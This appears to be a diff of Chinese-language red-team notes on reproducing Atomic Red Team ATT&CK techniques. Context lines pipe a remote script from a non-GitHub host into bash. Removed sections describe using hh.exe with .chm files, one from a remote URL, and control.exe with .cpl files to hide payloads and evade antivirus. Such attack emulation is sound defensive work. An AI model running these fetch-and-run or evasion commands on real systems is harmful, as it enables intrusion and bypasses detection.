@@ -34,23 +34,8 @@ bash -c "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/
 bash -c "wget --quiet -O - http://snappyzz.com/echo-art-fish.sh | bash"
 ```
 centos上运行成功
-#### T1223 - Compiled HTML File
-编译的html文件(.chm)可运行如下:HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX.并通过hh.exe来打开他们,红队可用chm文件来隐藏一段payload,此技术也可以来绕过一些检测病毒检测.运行如下命令,或者直接打开文件
-```
-hh.exe D:\pycharmproject\atomic-red-team-master\atomics\T1223\src\T1223.chm
-```
-windows10上运行成功
 
-或者
-```bash
-hh.exe http://snappyzz.com/T1223.chm		\\这个没有成功复现
-```
-#### T1196 - Control Panel Items
-控制面板允许用户查看和修改电脑配置,也可以将cpl文件作为参数,运行恶意文件,来绕过一些病毒检测
-```bash
-control.exe D:\pycharmproject\atomic-red-team-master\atomics\T1196\bin\calc.cpl	//这里cpl一定要采用绝对路径否则失败
-```
-windows10上运行成功
+
 #### T1173 - Dynamic Data Exchange
 关于动态数据交换（DDE, Dynamic Data Exchange）:DDE是一种动态数据交换机制（Dynamic Data Exchange，DDE）。使用DDE通讯需要两个Windows应用程序，其中一个作为服务器处理信息，另外一个作为客户机从服务器获得信息。客户机应用程序向当前所激活的服务器应用程序发送一条消息请求信息，服务器应用程序根据该信息作出应答，从而实现两个程序之间的数据交换。红队可用DDE来运行二进制命令,微软的文档可以用来放入DDE命令
 
